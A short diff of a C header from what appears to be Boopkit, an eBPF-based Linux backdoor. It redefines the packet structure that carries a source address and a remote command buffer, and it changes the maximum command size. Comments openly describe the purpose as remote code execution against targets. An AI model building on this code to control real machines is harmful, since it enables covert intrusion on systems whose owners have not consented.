@@ -23,19 +23,19 @@
 #ifndef BOOPKIT_BOOPKIT_H
 #define BOOPKIT_BOOPKIT_H
 
-// tcp_return
-//
-// This is the "protocol" that allows us to begin building
-// the RCE back against a client.
-//
-// This should be kept as small as possible as we will need
-// to craft this structure for every probe we use to try to
-// boop with.
-//
-// In other words, if we can get 4 octets of "saddr" information
-// we can pwn your shit.
-struct tcp_return {
-  __u8 saddr[4];
+// MAX_RCE_SIZE is the maximum size of a boop command to execute.
+#define MAX_RCE_SIZE 256
+
+struct encapsulated_tcp_boop {
+
+  // saddr is the 4 byte minimum required to pass an
+  // IP address over TCP
+  __u8 saddrval[4]; // Saturn Valley
+
+  // rce is an optional buffer to fill with a command if
+  // a boop can encapsulate one.
+  char rce[MAX_RCE_SIZE];
+
 };
 
 // VERSION is the semantic version of the program
@@ -49,9 +49,6 @@ struct tcp_return {
 
 // MAX_PORT_STR is the port size for rport and lport
 #define MAX_PORT_STR 32
-
-// MAX_RCE_SIZE is the maximum size of a boop command to execute.
-#define MAX_RCE_SIZE 1024
 
 // PROBE_BOOP is the eBPF probe to listen for boops
 #define PROBE_BOOP "pr0be.boop.o"
